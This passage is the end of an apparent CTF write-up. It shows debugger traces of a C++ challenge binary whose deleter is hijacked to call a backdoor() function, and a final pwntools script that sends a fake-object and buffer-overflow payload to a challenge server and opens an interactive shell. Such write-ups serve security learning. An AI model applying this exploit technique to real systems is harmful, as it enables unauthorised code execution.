</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x4025cc</span> <span style="color:#f92672">&lt;</span>std<span style="color:#f92672">::</span>unique_ptr<span style="color:#f92672">&lt;</span>BOFApp, std<span style="color:#f92672">::</span>default_delete<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">&gt;</span> <span style="color:#f92672">&gt;::~</span>unique_ptr()<span style="color:#f92672">+</span><span style="color:#ae81ff">60</span><span style="color:#f92672">&gt;</span>    mov    rax, qword ptr [rbp <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x18</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x4025d0</span> <span style="color:#f92672">&lt;</span>std<span style="color:#f92672">::</span>unique_ptr<span style="color:#f92672">&lt;</span>BOFApp, std<span style="color:#f92672">::</span>default_delete<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">&gt;</span> <span style="color:#f92672">&gt;::~</span>unique_ptr()<span style="color:#f92672">+</span><span style="color:#ae81ff">64</span><span style="color:#f92672">&gt;</span>    mov    rdi, rax
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">►</span> <span style="color:#ae81ff">0x4025d3</span> <span style="color:#f92672">&lt;</span>std<span style="color:#f92672">::</span>unique_ptr<span style="color:#f92672">&lt;</span>BOFApp, std<span style="color:#f92672">::</span>default_delete<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">&gt;</span> <span style="color:#f92672">&gt;::~</span>unique_ptr()<span style="color:#f92672">+</span><span style="color:#ae81ff">67</span><span style="color:#f92672">&gt;</span>    call   std<span style="color:#f92672">::</span>remove_reference<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">*&amp;&gt;::</span>type<span style="color:#f92672">&amp;&amp;</span> std<span style="color:#f92672">::</span>move<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">*&amp;&gt;</span>(BOFApp<span style="color:#f92672">*&amp;</span>)                      <span style="color:#f92672">&lt;</span>std<span style="color:#f92672">::</span>remove_reference<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">*&amp;&gt;::</span>type<span style="color:#f92672">&amp;&amp;</span> std<span style="color:#f92672">::</span>move<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">*&amp;&gt;</span>(BOFApp<span style="color:#f92672">*&amp;</span>)<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>        rdi: <span style="color:#ae81ff">0x4022c6</span> (main<span style="color:#f92672">+</span><span style="color:#ae81ff">73</span>) <span style="color:#960050;background-color:#1e0010">◂—</span> call <span style="color:#ae81ff">0xffffffffe907ac13</span>
</span></span><span style="display:flex;"><span>        rsi: <span style="color:#ae81ff">0x4022f1</span> (main<span style="color:#f92672">+</span><span style="color:#ae81ff">116</span>) <span style="color:#960050;background-color:#1e0010">◂—</span> endbr64 
</span></span><span style="display:flex;"><span>        rdx: <span style="color:#ae81ff">0x1</span>
</span></span><span style="display:flex;"><span>        rcx: <span style="color:#ae81ff">0x4022f1</span> (main<span style="color:#f92672">+</span><span style="color:#ae81ff">116</span>) <span style="color:#960050;background-color:#1e0010">◂—</span> endbr64
</span></span></code></pre></div><p>Finally, we manage to control rdx register to point to the <code>backdoor()</code> function.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span> <span style="color:#ae81ff">0x4027d5</span> <span style="color:#f92672">&lt;</span>std<span style="color:#f92672">::</span>default_delete<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">&gt;::</span><span style="color:#66d9ef">operator</span>()(BOFApp<span style="color:#f92672">*</span>) <span style="color:#66d9ef">const</span><span style="color:#f92672">+</span><span style="color:#ae81ff">27</span><span style="color:#f92672">&gt;</span>             je     std<span style="color:#f92672">::</span>default_delete<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">&gt;::</span><span style="color:#66d9ef">operator</span>()(BOFApp<span style="color:#f92672">*</span>) <span style="color:#66d9ef">const</span><span style="color:#f92672">+</span><span style="color:#ae81ff">44</span>                      <span style="color:#f92672">&lt;</span>std<span style="color:#f92672">::</span>default_delete<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">&gt;::</span><span style="color:#66d9ef">operator</span>()(BOFApp<span style="color:#f92672">*</span>) <span style="color:#66d9ef">const</span><span style="color:#f92672">+</span><span style="color:#ae81ff">44</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x4027d7</span> <span style="color:#f92672">&lt;</span>std<span style="color:#f92672">::</span>default_delete<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">&gt;::</span><span style="color:#66d9ef">operator</span>()(BOFApp<span style="color:#f92672">*</span>) <span style="color:#66d9ef">const</span><span style="color:#f92672">+</span><span style="color:#ae81ff">29</span><span style="color:#f92672">&gt;</span>             mov    rdx, qword ptr [rax]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x4027da</span> <span style="color:#f92672">&lt;</span>std<span style="color:#f92672">::</span>default_delete<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">&gt;::</span><span style="color:#66d9ef">operator</span>()(BOFApp<span style="color:#f92672">*</span>) <span style="color:#66d9ef">const</span><span style="color:#f92672">+</span><span style="color:#ae81ff">32</span><span style="color:#f92672">&gt;</span>             add    rdx, <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x4027de</span> <span style="color:#f92672">&lt;</span>std<span style="color:#f92672">::</span>default_delete<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">&gt;::</span><span style="color:#66d9ef">operator</span>()(BOFApp<span style="color:#f92672">*</span>) <span style="color:#66d9ef">const</span><span style="color:#f92672">+</span><span style="color:#ae81ff">36</span><span style="color:#f92672">&gt;</span>             mov    rdx, qword ptr [rdx]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x4027e1</span> <span style="color:#f92672">&lt;</span>std<span style="color:#f92672">::</span>default_delete<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">&gt;::</span><span style="color:#66d9ef">operator</span>()(BOFApp<span style="color:#f92672">*</span>) <span style="color:#66d9ef">const</span><span style="color:#f92672">+</span><span style="color:#ae81ff">39</span><span style="color:#f92672">&gt;</span>             mov    rdi, rax
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">►</span> <span style="color:#ae81ff">0x4027e4</span> <span style="color:#f92672">&lt;</span>std<span style="color:#f92672">::</span>default_delete<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">&gt;::</span><span style="color:#66d9ef">operator</span>()(BOFApp<span style="color:#f92672">*</span>) <span style="color:#66d9ef">const</span><span style="color:#f92672">+</span><span style="color:#ae81ff">42</span><span style="color:#f92672">&gt;</span>             call   rdx                           <span style="color:#f92672">&lt;</span>backdoor()<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>        rdi: <span style="color:#ae81ff">0x4eb0c0</span> (user_canary) <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0x4eb0c0</span>
</span></span><span style="display:flex;"><span>        rsi: <span style="color:#ae81ff">0x4eb0c0</span> (user_canary) <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0x4eb0c0</span>
</span></span><span style="display:flex;"><span>        rdx: <span style="color:#ae81ff">0x402263</span> (backdoor()) <span style="color:#960050;background-color:#1e0010">◂—</span> endbr64 
</span></span><span style="display:flex;"><span>        rcx: <span style="color:#ae81ff">0x4022f1</span> (main<span style="color:#f92672">+</span><span style="color:#ae81ff">116</span>) <span style="color:#960050;background-color:#1e0010">◂—</span> endbr64 
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x4027e6</span> <span style="color:#f92672">&lt;</span>std<span style="color:#f92672">::</span>default_delete<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">&gt;::</span><span style="color:#66d9ef">operator</span>()(BOFApp<span style="color:#f92672">*</span>) <span style="color:#66d9ef">const</span><span style="color:#f92672">+</span><span style="color:#ae81ff">44</span><span style="color:#f92672">&gt;</span>             nop    
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x4027e7</span> <span style="color:#f92672">&lt;</span>std<span style="color:#f92672">::</span>default_delete<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">&gt;::</span><span style="color:#66d9ef">operator</span>()(BOFApp<span style="color:#f92672">*</span>) <span style="color:#66d9ef">const</span><span style="color:#f92672">+</span><span style="color:#ae81ff">45</span><span style="color:#f92672">&gt;</span>             leave  
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x4027e8</span> <span style="color:#f92672">&lt;</span>std<span style="color:#f92672">::</span>default_delete<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">&gt;::</span><span style="color:#66d9ef">operator</span>()(BOFApp<span style="color:#f92672">*</span>) <span style="color:#66d9ef">const</span><span style="color:#f92672">+</span><span style="color:#ae81ff">46</span><span style="color:#f92672">&gt;</span>             ret    
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x4027e9</span>                                                                         nop    
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x4027ea</span> <span style="color:#f92672">&lt;</span>std<span style="color:#f92672">::</span>unique_ptr<span style="color:#f92672">&lt;</span>BOFApp, std<span style="color:#f92672">::</span>default_delete<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">&gt;</span> <span style="color:#f92672">&gt;::</span>get() <span style="color:#66d9ef">const</span><span style="color:#f92672">&gt;</span>    endbr64 
</span></span></code></pre></div><p>Get flag</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#f92672">[</span>DEBUG<span style="color:#f92672">]</span> Received 0x1c bytes:
</span></span><span style="display:flex;"><span>    b<span style="color:#e6db74">&#39;sh: 1: /readflag: not found\n&#39;</span>
</span></span><span style="display:flex;"><span>sh: 1: /readflag: not found
</span></span></code></pre></div><p>Final script:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">=</span>process(<span style="color:#e6db74">&#39;./a.out&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
</span></span><span style="display:flex;"><span>        cmd<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        b* 0x420978 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        b* 0x4038fc
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        c
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>        gdb<span style="color:#f92672">.</span>attach(io, gdbscript<span style="color:#f92672">=</span>cmd)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">=</span>remote(<span style="color:#e6db74">&#39;43.132.193.22&#39;</span>, <span style="color:#ae81ff">9999</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>elf<span style="color:#f92672">=</span>context<span style="color:#f92672">.</span>binary<span style="color:#f92672">=</span>ELF(<span style="color:#e6db74">&#39;./a.out&#39;</span>)
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>
</span></span><span style="display:flex;"><span>system<span style="color:#f92672">=</span><span style="color:#ae81ff">0x000000000042dc10</span>
</span></span><span style="display:flex;"><span>pop_rdi<span style="color:#f92672">=</span><span style="color:#ae81ff">0x0000000000403090</span>
</span></span><span style="display:flex;"><span>bin_sh<span style="color:#f92672">=</span><span style="color:#ae81ff">0x4bdd62</span>
</span></span><span style="display:flex;"><span>backdoor<span style="color:#f92672">=</span><span style="color:#ae81ff">0x000000000403387</span>
</span></span><span style="display:flex;"><span>user_canary<span style="color:#f92672">=</span><span style="color:#ae81ff">0x4f4aa0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">=</span>p64(backdoor)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span><span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0x4f4aa0</span>) <span style="color:#75715e"># fake obj</span>
</span></span><span style="display:flex;"><span>pause()
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>send(pl<span style="color:#f92672">+</span>(<span style="color:#ae81ff">64</span><span style="color:#f92672">-</span>len(pl))<span style="color:#f92672">*</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">96</span><span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0x0000000000403407</span>)<span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0x4f4aa0</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>pause()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(pl)
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h1 id="reference">Reference</h1>
<p><a href="https://maskray.me/blog/2020-11-08-stack-unwinding">https://maskray.me/blog/2020-11-08-stack-unwinding</a></p>
<p><a href="https://github.com/chop-project/">https://github.com/chop-project/</a></p>
<p><a href="https://www.cnblogs.com/catch/p/3604516.html">https://www.cnblogs.com/catch/p/3604516.html</a></p>
<p><a href="https://baiy.cn/doc/cpp/inside_exception.htm">https://baiy.cn/doc/cpp/inside_exception.htm</a></p></div>
</article>

    <hr />
    <p class="articleTagsContainer">
        <span> </span>
        <strong>Tags:</strong>
        
            <a
                
                href="/tags/ctf/">#ctf</a>
        
    </p>






                    </main><footer>
    <hr />

<p><small>
        2023 &copy; 
    </small></p>
    <p><small>
        <a href='https://gitlab.com/gabmus/hugo-ficurinia'>Ficurinia theme</a> for <a href='https://gohugo.io'>Hugo</a> by <a href='https://gabmus.org'>Gabriele Musco</a>. Licensed under <a href='https://www.gnu.org/licenses/agpl-3.0.html'>GNU AGPLv3</a>.
    </small></p>
</footer>
</div>
            </div>
        </div>


</body>
</html>
